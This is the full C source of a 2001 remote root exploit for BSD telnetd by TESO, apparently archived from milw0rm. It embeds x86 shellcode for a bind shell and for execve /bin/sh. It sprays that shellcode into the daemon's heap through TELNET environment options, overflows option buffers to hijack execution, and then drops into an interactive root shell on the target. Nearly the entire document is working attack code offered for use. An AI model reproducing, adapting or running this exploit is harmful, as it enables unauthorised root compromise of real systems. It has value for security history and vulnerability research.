<html><head><title>BSD (telnetd) Remote Root Exploit</title></head><pre>/* 7350854 - x86/bsd telnetd remote root exploit
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security. This includes especially the Bugtraq mailing list, the
 * www.hack.co.za website and any public exploit archive.
 *
 * (C) COPYRIGHT TESO Security, 2001
 * All Rights Reserved
 *
 *****************************************************************************
 * bug found by scut 2001/06/09
 * further research by smiler, zip, lorian and me.
 * thanks to zip's cool friend for giving me a testbed to play on
 *
 * tested against: BSDI BSD/OS 4.1
 *                 NetBSD 1.5
 *                 FreeBSD 3.1
 *                 FreeBSD 4.0-REL
 *                 FreeBSD 4.2-REL
 *                 FreeBSD 4.3-BETA
 *                 FreeBSD 4.3-STABLE
 *                 FreeBSD 4.3-RELEASE
 *
 */

#define VERSION &quot;0.0.7&quot;

#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;arpa/telnet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;


/* global variables, uhhohh!
 */
int     mode = 16;
int     num = 245;
int     pop = 31500;    /* puts code at 0x08fdff0a */
int     bs = 1;         /* buffer start */

int     num34 = 244;
int     pop34 = 71833;  /* puts code at 0x0a0d08fe */
int     bs34 = 0;

int     walk;           /* populator walker */
int     force = 0;      /* force exploitation */
int     checkonly = 0;  /* check telnetd only */


void usage (char *progname);
int xp_check (int fd);
void xp_pop (int fd);
void xp_shrinkwin (int fd);
void xp_setenv (int fd, unsigned char *var, unsigned char *val);
void xp (int fd);
void shell (int sock);
void hexdump (char *desc, unsigned char *data, unsigned int amount);

/* imported from shellkit */
unsigned long int random_get (unsigned long int low, unsigned long int high);
void random_init (void);
int bad (unsigned char u);
int badstr (unsigned char *code, int code_len, unsigned char *bad,
        int bad_len);
unsigned long int x86_nop_rwreg (void);
unsigned long int x86_nop_xfer (char *xferstr);
unsigned int x86_nop (unsigned char *dest, unsigned int dest_len,
        unsigned char *bad, int bad_len);

#define BSET(dest, len, val, bw) { \
        dest &amp;= ~(((unsigned char) ~0) &gt;&gt; bw);  /* clear lower bits */ \
        dest |= val &lt;&lt; (8 - bw - len);          /* set value bits */ \
        bw += len; \
}

/* imported from network.c */
#define NET_CONNTIMEOUT 60
int     net_conntimeout = NET_CONNTIMEOUT;

unsigned long int net_resolve (char *host);
int net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, int sec);


/* x86/bsd PIC portshell shellcode
 * by lorian/teso
 * port 0x4444 (might want to change it here)
 */
unsigned char   x86_bsd_portshell[] =
        &quot;\x31\xdb\xf7\xe3\x53\x43\x53\x43\x53\xb0\x61\x53&quot;
        &quot;\xcd\x80\x96\x52\x66\x68\x44\x44\x66\x53\x89\xe5&quot;
                                /* ^^  ^^ port */
        &quot;\x6a\x10\x55\x56\x56\x6a\x68\x58\xcd\x80\xb0\x6a&quot;
        &quot;\xcd\x80\x60\xb0\x1e\xcd\x80\x53\x50\x50\xb0\x5a&quot;
        &quot;\xcd\x80\x4b\x79\xf6\x52\x89\xe3\x68\x6e\x2f\x73&quot;
        &quot;\x68\x68\x2f\x2f\x62\x69\x60\x5e\x5e\xb0\x3b\xcd&quot;
        &quot;\x80&quot;;

/* x86/bsd PIC execve shellcode
 * by lorian/teso
 */
unsigned char   x86_bsd_execvesh[] =
        &quot;\x6a\x3b\x58\x99\x52\x89\xe3\x68\x6e\x2f\x73\x68&quot;
        &quot;\x68\x2f\x2f\x62\x69\x60\x5e\x5e\xcd\x80&quot;;

/* x86/bsd(i)+solaris execve shellcode
 * by lorian/teso
 */
unsigned char   x86_bsd_compaexec[] =
    &quot;\xbf\xee\xee\xee\x08\xb8\xff\xf8\xff\x3c\xf7\xd0&quot;
    &quot;\xfd\xab\x31\xc0\x99\xb0\x9a\xab\xfc\xab\xb0\x3b&quot;
    &quot;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&quot;
    &quot;\xe3\x52\x53\x89\xe1\x52\x51\x53\xff\xd7&quot;;


unsigned char * shellcode = x86_bsd_compaexec;


#define COL 55


void
usage (char *progname)
{
        fprintf (stderr, &quot;usage: %s [-n &lt;num&gt;] [-c] [-f] &lt;ip&gt;\n\n&quot;, progname);
        fprintf (stderr, &quot;-n num\tnumber of populators, for testing purposes\n&quot;
                &quot;-c\tcheck exploitability only, do not exploit\n&quot;
                &quot;-f\tforce mode, override check results\n\n&quot;);
        fprintf (stderr, &quot;WARNING: this is no easy exploit, we have to get things tightly aligned and\n&quot;
                        &quot;send 16/34mb of traffic to the remote telnet daemon. it might not be able to\n&quot;
                        &quot;take that, or it will take very long for it (&gt; 1h). beware.\n\n&quot;);

        fprintf (stderr, &quot;tested:\tFreeBSD 3.1, 4.0-REL, 4.2-REL, 4.3-BETA, 4.3-STABLE, 4.3-RELEASE \n&quot;
                        &quot;\tNetBSD 1.5\n&quot;
                        &quot;\tBSDI BSD/OS 4.1\n\n&quot;);

        exit (EXIT_FAILURE);
}

int
main (int argc, char *argv[])
{
        char                    c;
        char *                  progname;
        char *                  dest;
        int                     i, j, fd,
                                dots = 0;
        int                     popc;
        struct timeval          start,
                                cur;
        unsigned long long int  g_pct,  /* gaussian percentage */
                                g_all;  /* gaussian overall */


        fprintf (stderr, &quot;7350854 - x86/bsd telnetd remote root\n&quot;
                &quot;by zip, lorian, smiler and scut.\n\n&quot;);

        progname = argv[0];
        if (argc &lt; 2)
                usage (progname);


        while ((c = getopt (argc, argv, &quot;n:cf&quot;)) != EOF) {
                switch (c) {
                case 'n':
                        num = atoi (optarg);
                        break;
                case 'c':
                        checkonly = 1;
                        break;
                case 'f':
                        force = 1;
                        break;
                default:
                        usage (progname);
                        break;
                }
        }

        dest = argv[argc - 1];
        if (dest[0] == '-')
                usage (progname);

        fd = net_connect (NULL, dest, 23, 20);
        if (fd &lt;= 0) {
                fprintf (stderr, &quot;failed to connect\n&quot;);
                exit (EXIT_FAILURE);
        }

        random_init ();

        if (xp_check (fd) == 0 &amp;&amp; force == 0) {
                printf (&quot;aborting\n&quot;);
#ifndef DEBUG
                exit (EXIT_FAILURE);
#endif
        }
        close (fd);

        if (checkonly)
                exit (EXIT_SUCCESS);

        fd = net_connect (NULL, dest, 23, 20);
        if (fd &lt;= 0) {
                fprintf (stderr, &quot;failed to connect the second time\n&quot;);
                exit (EXIT_FAILURE);
        }

        printf (&quot;\n#############################################################################\n\n&quot;);
        printf (&quot;ok baby, times are rough, we send %dmb traffic to the remote\n&quot;
                &quot;telnet daemon process, it will spill badly. but then, there is no\n&quot;
                &quot;other way, sorry...\n\n&quot;, mode);

#ifdef DEBUG
        getchar ();
#endif
        printf (&quot;## setting populators to populate heap address space\n&quot;);

        g_all = ((unsigned long long int)(pop / 2)) *
                        ((unsigned long long int)(pop + 1));
        g_pct = 0;

        printf (&quot;## number of setenvs (dots / network): %d\n&quot;, pop);
        printf (&quot;## number of walks (percentage / cpu): %Lu\n&quot;, g_all);
        printf (&quot;##\n&quot;);
        printf (&quot;## the percentage is more realistic than the dots ;)\n&quot;);
        printf (&quot;\n&quot;);
        printf (&quot;percent |&quot;);

        popc = pop / COL;
        for (i = pop / popc ; i &gt;= 0 ; --i)
                printf (&quot;-&quot;);
        printf (&quot;|      ETA |\n&quot;);

        gettimeofday (&amp;start, NULL);

        for (walk = 0 ; walk &lt; pop ; ++walk) {
                xp_pop (fd);

                g_pct += walk;

                if (walk % popc == 0)
                        dots += 1;

                if (walk % 200 == 0) {
                        int                     pct;
                        float                   pct_f;
                        unsigned long int       diff;

                        pct = (int) ((g_pct * 100) / g_all);
                        pct_f = g_pct * 100;
                        pct_f /= (float) g_all;

                        /* calculate difference not caring about accuracy */
                        gettimeofday (&amp;cur, NULL);
                        diff = cur.tv_sec - start.tv_sec;

                        printf ((pct == 100) ? &quot;\r%3.2f%% |&quot; : ((pct / 10) ?
                                &quot;\r %2.2f%% |&quot; : &quot;\r  %1.2f%% |&quot;), pct_f);
                        for (j = 0 ; j &lt; dots ; ++j)
                                printf (&quot;.&quot;);
                        for ( ; j &lt;= COL ; ++j)
                                printf (&quot; &quot;);

                        if (pct != 0) {
                                diff = (int) ((((float)(100 - pct_f)) /
                                        (float) pct_f) * diff);
                                printf (&quot;| %02lu:%02lu:%02lu |&quot;,
                                        diff / 3600, (diff % 3600) / 60,
                                        diff % 60);
                        } else {
                                printf (&quot;| --:--:-- |&quot;);
                        }

                        fflush (stdout);
                }
        }
        printf (&quot;\n\n&quot;);

        printf (&quot;## sleeping for 10 seconds to let the process recover\n&quot;);
        sleep (10);

#ifdef DEBUG
        getchar ();
#endif
        /* return into 0x08feff0a */
        xp (fd);
        sleep (1);

        printf (&quot;## ok, you should now have a root shell\n&quot;);
        printf (&quot;## as always, after hard times, there is a reward...\n&quot;);
        printf (&quot;\n\ncommand: &quot;);
        fflush (stdout);

        shell (fd);

        exit (EXIT_SUCCESS);
}


void
xp (int fd)
{
        int             n;
        unsigned char   buf[2048];


        /* basic overflow */
        for (n = bs ; n &lt; sizeof (buf) ; ++n)
                buf[n] = (n - bs) % 2 ? '\xf6' : '\xff';

        /* some nifty alignment */
        buf[0] = '\xff';        /* IAC */
        buf[1] = '\xf5';        /* AO  */

        if (mode == 16) {
                buf[2] = '\xff';        /* IAC */
                buf[3] = '\xfb';        /* WILL */
                buf[4] = '\x26';        /* ENCRYPTION */
        }

        /* force 0x08feff0a as return */
        buf[num++] = '\xff';
        buf[num++] = '\xfb';
        buf[num++] = '\x08';

        /* and the output_encrypt overwrite action, yay! */
        buf[num++] = '\xff';
        buf[num++] = '\xf6';

        /* XXX: should not fail here, though we should better loop and check */
        n = send (fd, buf, num, 0);
        if (n != num) {
                perror (&quot;xp:send&quot;);
        }
}


#ifdef INSANE_MIND

void
xp_shrinkwin (int fd)
{
        int             n;
        int             iobc;
        int             p = 0;
        unsigned char   buf[2048];
        char            c;
        int             val;
        int             len;

        for (n = 0 ; n &lt; sizeof (buf) ; ++n)
                buf[n] = n % 2 ? '\xf6' : '\xff';

        len = sizeof (val);
        getsockopt (fd, SOL_SOCKET, SO_SNDLOWAT, &amp;val, &amp;len);
        printf (&quot;SO_SNDLOWAT = %d\n&quot;, val);
        val = 1;
        printf (&quot;setsockopt: %s\n&quot;,
                setsockopt (fd, SOL_SOCKET, SO_SNDLOWAT, &amp;val, sizeof(val)) ?
                &quot;FAILED&quot; : &quot;SUCCESS&quot;);
        val = 1234;
        getsockopt (fd, SOL_SOCKET, SO_SNDLOWAT, &amp;val, &amp;len);
        printf (&quot;SO_SNDLOWAT = %d\n&quot;, val);

        getchar();
        while (1) {
                if (p &gt; 105)
                        c = getchar();
                if (c == 'r') {
                        getchar();
                        read (fd, &amp;buf[1024], 384);
                } else if (c == 'o') {
                        getchar();
                        send (fd, &quot;7&quot;, 1, MSG_OOB);
                } else if (c != 'r') {
                        usleep(100000);
                        n = send (fd, buf, 112, 0);
                        ioctl (fd, FIONREAD, &amp;iobc);
                        len = sizeof (val);
                        getsockopt (fd, SOL_SOCKET, SO_RCVBUF, &amp;val, &amp;len);
                        printf (&quot;%02d. send: %d  local: %d/%d (%d left)\n&quot;,
                                ++p, n, iobc, val, val - iobc);
                }
        }
}
#endif


/* xp_pop - populator function
 *
 * causes remote telnet daemon to setenv() variables with our content, populating
 * the heap with shellcode. this will get us more nopspace and place our shellcode
 * where the nice addresses are, that we can create by writing telnet option
 * strings.
 *
 * XXX: there seems to be a maximum size for the environment value you can set,
 *      which is 510. we use 496 bytes for nopspace and shellcode therefore.
 *      should work, rather similar to tsig tcp/malloc exploitation. -sc
 */

void
xp_pop (int fd)
{
        unsigned char   var[16];
        unsigned char   storebuf[496];
        sprintf (var, &quot;%06x&quot;, walk);
#ifdef DEBUG
        memset (storebuf, '\xcc', sizeof (storebuf));
#else
/*      memset (storebuf, '\x90', sizeof (storebuf));   */
        x86_nop (storebuf, sizeof (storebuf), &quot;\x00\x01\x02\x03\xff&quot;, 5);
        memcpy (storebuf + sizeof (storebuf) - strlen (shellcode) - 1,
                shellcode, strlen (shellcode));
#endif
        storebuf[sizeof (storebuf) - 1] = '\0';

        xp_setenv (fd, var, storebuf);
}


void
xp_setenv (int fd, unsigned char *var, unsigned char *val)
{
        int             n = 0;
        unsigned char   buf[2048];

        buf[n++] = IAC;
        buf[n++] = SB;
        buf[n++] = TELOPT_NEW_ENVIRON;
        buf[n++] = TELQUAL_IS;
        buf[n++] = ENV_USERVAR;

        /* should not contain &lt; 0x04 */
        while (*var) {
                if (*var == IAC)
                        buf[n++] = *var;
                buf[n++] = *var++;
        }
        buf[n++] = NEW_ENV_VALUE;
        while (*val) {
                if (*val == IAC)
                        buf[n++] = *val;
                buf[n++] = *val++;
        }
        buf[n++] = IAC;
        buf[n++] = SE;

        if (send (fd, buf, n, 0) != n) {
                perror (&quot;xp_setenv:send&quot;);
                exit (EXIT_FAILURE);
        }
}


int
xp_check (int fd)
{
        int             n;
        unsigned int    expect_len = 15;
        unsigned char   expected[] =
                &quot;\x0d\x0a\x5b\x59\x65\x73\x5d\x0d\x0a\xff\xfe\x08\xff\xfd\x26&quot;;
                /* \r  \n  [   Y   e   s   ]   \r  \n IAC DONT 08 IAC DO 26*/
        unsigned int    additional_len = 8;
        unsigned char   additional[] =
                &quot;\xff\xfa\x26\x01\x01\x02\xff\xf0&quot;;
                /*IAC SB  ENC ........... IAC SE */

        unsigned char   buf[128];

        read (fd, buf, sizeof (buf));

        n = 0;
        buf[n++] = IAC;                 /* 0xff */
        buf[n++] = AYT;                 /* 0xf6 */

        buf[n++] = IAC;                 /* 0xff */
        buf[n++] = WILL;                /* 0xfb */
        buf[n++] = TELOPT_NAOL;         /* 0x08 */

        buf[n++] = IAC;                 /* 0xff */
        buf[n++] = WILL;                /* 0xfb */
        buf[n++] = TELOPT_ENCRYPT;      /* 0x26 */

#ifdef DEBUG
        hexdump (&quot;check send buffer&quot;, buf, n);
#endif
        if (send (fd, buf, n, 0) != n) {
                perror (&quot;xp_check:send&quot;);
                exit (EXIT_FAILURE);
        }

        n = read (fd, buf, sizeof (buf));
#ifdef DEBUG
        hexdump (&quot;check recv buffer&quot;, buf, n);
#endif

        if (memcmp (buf, expected, expect_len) == 0) {
                if (memcmp (buf+expect_len, additional, additional_len) == 0) {
                        mode = 16;
                } else {
                        mode = 34;
                        bs = bs34;
                }
                printf (&quot;check: PASSED, using %dmb mode\n&quot;, mode);

                return (1);
        }

        printf (&quot;check: FAILED\n&quot;);

        return (0);
}


void
shell (int sock)
{
        int     l;
        char    buf[512];
        fd_set  rfds;


        while (1) {
                FD_SET (0, &amp;rfds);
                FD_SET (sock, &amp;rfds);

                select (sock + 1, &amp;rfds, NULL, NULL, NULL);
                if (FD_ISSET (0, &amp;rfds)) {
                        l = read (0, buf, sizeof (buf));
                        if (l &lt;= 0) {
                                perror (&quot;read user&quot;);
                                exit (EXIT_FAILURE);
                        }
                        write (sock, buf, l);
                }

                if (FD_ISSET (sock, &amp;rfds)) {
                        l = read (sock, buf, sizeof (buf));
                        if (l &lt;= 0) {
                                perror (&quot;read remote&quot;);
                                exit (EXIT_FAILURE);
                        }
                        write (1, buf, l);
                }
        }
}


/* ripped from zodiac */
void
hexdump (char *desc, unsigned char *data, unsigned int amount)
{
        unsigned int    dp, p;  /* data pointer */
        const char      trans[] =
                &quot;................................ !\&quot;#$%&amp;'()*+,-./0123456789&quot;
                &quot;:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm&quot;
                &quot;nopqrstuvwxyz{|}~....................................&quot;
                &quot;.....................................................&quot;
                &quot;........................................&quot;;


        printf (&quot;/* %s, %u bytes */\n&quot;, desc, amount);

        for (dp = 1; dp &lt;= amount; dp++) {
                fprintf (stderr, &quot;%02x &quot;, data[dp-1]);
                if ((dp % 8) == 0)
                        fprintf (stderr, &quot; &quot;);
                if ((dp % 16) == 0) {
                        fprintf (stderr, &quot;| &quot;);
                        p = dp;
                        for (dp -= 16; dp &lt; p; dp++)
                                fprintf (stderr, &quot;%c&quot;, trans[data[dp]]);
                        fflush (stderr);
                        fprintf (stderr, &quot;\n&quot;);
                }
                fflush (stderr);
        }
        if ((amount % 16) != 0) {
                p = dp = 16 - (amount % 16);
                for (dp = p; dp &gt; 0; dp--) {
                        fprintf (stderr, &quot;   &quot;);
                        if (((dp % 8) == 0) &amp;&amp; (p != 8))
                                fprintf (stderr, &quot; &quot;);
                        fflush (stderr);
                }
                fprintf (stderr, &quot; | &quot;);
                for (dp = (amount - (16 - p)); dp &lt; amount; dp++)
                        fprintf (stderr, &quot;%c&quot;, trans[data[dp]]);
                fflush (stderr);
        }
        fprintf (stderr, &quot;\n&quot;);

        return;
}



unsigned long int
net_resolve (char *host)
{
        long            i;
        struct hostent  *he;

        i = inet_addr(host);
        if (i == -1) {
                he = gethostbyname(host);
                if (he == NULL) {
                        return (0);
                } else {
                        return (*(unsigned long *) he-&gt;h_addr);
                }
        }
        return (i);
}


int
net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, int sec)
{
        int                     n,
                                len,
                                error,
                                flags;
        int                     fd;
        struct timeval          tv;
        fd_set                  rset, wset;
        struct sockaddr_in      csa;

        if (cs == NULL)
                cs = &amp;csa;

        /* first allocate a socket */
        cs-&gt;sin_family = AF_INET;
        cs-&gt;sin_port = htons (port);
        fd = socket (cs-&gt;sin_family, SOCK_STREAM, 0);
        if (fd == -1)
                return (-1);

        if (!(cs-&gt;sin_addr.s_addr = net_resolve (server))) {
                close (fd);
                return (-1);
        }

        flags = fcntl (fd, F_GETFL, 0);
        if (flags == -1) {
                close (fd);
                return (-1);
        }
        n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
        if (n == -1) {
                close (fd);
                return (-1);
        }

        error = 0;

        n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
        if (n &lt; 0) {
                if (errno != EINPROGRESS) {
                        close (fd);
                        return (-1);
                }
        }
        if (n == 0)
                goto done;

        FD_ZERO(&amp;rset);
        FD_ZERO(&amp;wset);
        FD_SET(fd, &amp;rset);
        FD_SET(fd, &amp;wset);
        tv.tv_sec = sec;
        tv.tv_usec = 0;

        n = select(fd + 1, &amp;rset, &amp;wset, NULL, &amp;tv);
        if (n == 0) {
                close(fd);
                errno = ETIMEDOUT;
                return (-1);
        }
        if (n == -1)
                return (-1);

        if (FD_ISSET(fd, &amp;rset) || FD_ISSET(fd, &amp;wset)) {
                if (FD_ISSET(fd, &amp;rset) &amp;&amp; FD_ISSET(fd, &amp;wset)) {
                        len = sizeof(error);
                        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &amp;error, &amp;len) &lt; 0) {
                                errno = ETIMEDOUT;
                                return (-1);
                        }
                        if (error == 0) {
                                goto done;
                        } else {
                                errno = error;
                                return (-1);
                        }
                }
        } else
                return (-1);

done:
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
                return (-1);
        return (fd);
}


/* imported from shellkit */

unsigned long int
random_get (unsigned long int low, unsigned long int high)
{
        unsigned long int       val;

        if (low &gt; high) {
                low ^= high;
                high ^= low;
                low ^= high;
        }

        val = (unsigned long int) random ();
        val %= (high - low);
        val += low;

        return (val);
}


void
random_init (void)
{
        srandom (time (NULL));
}


int
bad (unsigned char u)
{
        if (u == '\x00' || u == '\x0a' || u == '\x0d' || u == '\x25')
                return (1);

        return (0);
}

int
badstr (unsigned char *code, int code_len, unsigned char *bad, int bad_len)
{
        int     n;

        for (code_len -= 1 ; code_len &gt;= 0 ; --code_len) {
                for (n = 0 ; n &lt; bad_len ; ++n)
                        if (code[code_len] == bad[n])
                                return (1);
        }

        return (0);
}

unsigned long int
x86_nop_rwreg (void)
{
        unsigned long int       reg;

        do {
                reg = random_get (0, 7);
        } while (reg == 4);     /* 4 = $esp */

        return (reg);
}



unsigned long int
x86_nop_xfer (char *xferstr)
{
        int                     bw = 0; /* bitfield walker */
        unsigned char           tgt;    /* resulting instruction */

        /* in a valid xferstr we trust */
        for (tgt = 0 ; xferstr != NULL &amp;&amp; xferstr[0] != '\0' ; ++xferstr) {
                switch (xferstr[0]) {
                case ('0'):
                        BSET (tgt, 1, 0, bw);
                        break;
                case ('1'):
                        BSET (tgt, 1, 1, bw);
                        break;
                case ('r'):
                        BSET (tgt, 3, x86_nop_rwreg (), bw);
                        break;
                case ('.'):
                        break;  /* ignore */
                default:
                        fprintf (stderr, &quot;on steroids, huh?\n&quot;);
                        exit (EXIT_FAILURE);
                        break;
                }
        }

        if (bw != 8) {
                fprintf (stderr, &quot;invalid bitwalker: bw = %d\n&quot;, bw);
                exit (EXIT_FAILURE);
        }

        return (tgt);
}


unsigned int
x86_nop (unsigned char *dest, unsigned int dest_len,
        unsigned char *bad, int bad_len)
{
        int     walk;
        int     bcount; /* bad counter */
        char *  xs;
        char *  xferstr[] = {
                &quot;0011.0111&quot;,    /* aaa */
                &quot;0011.1111&quot;,    /* aas */
                &quot;1001.1000&quot;,    /* cbw */
                &quot;1001.1001&quot;,    /* cdq */
                &quot;1111.1000&quot;,    /* clc */
                &quot;1111.1100&quot;,    /* cld */
                &quot;1111.0101&quot;,    /* cmc */
                &quot;0010.0111&quot;,    /* daa */
                &quot;0010.1111&quot;,    /* das */
                &quot;0100.1r&quot;,      /* dec &lt;reg&gt; */
                &quot;0100.0r&quot;,      /* inc &lt;reg&gt; */
                &quot;1001.1111&quot;,    /* lahf */
                &quot;1001.0000&quot;,    /* nop */
                &quot;1111.1001&quot;,    /* stc */
                &quot;1111.1101&quot;,    /* std */
                &quot;1001.0r&quot;,      /* xchg al, &lt;reg&gt; */
                NULL,
        };
        unsigned char   tgt;


        for (walk = 0 ; dest_len &gt; 0 ; dest_len -= 1 , walk += 1) {
                /* avoid endless loops on excessive badlisting */
                for (bcount = 0 ; bcount &lt; 16384 ; ++bcount) {
                        xs = xferstr[random_get (0, 15)];
                        tgt = x86_nop_xfer (xs);

                        dest[walk] = tgt;
                        if (badstr (&amp;dest[walk], 1, bad, bad_len) == 0)
                                break;
                }

                /* should not happen */
                if (bcount &gt;= 16384) {
                        fprintf (stderr, &quot;too much blacklisting, giving up...\n&quot;);
                        exit (EXIT_FAILURE);
                }
        }

        return (walk);
}

// milw0rm.com [2001-06-09]</pre></html>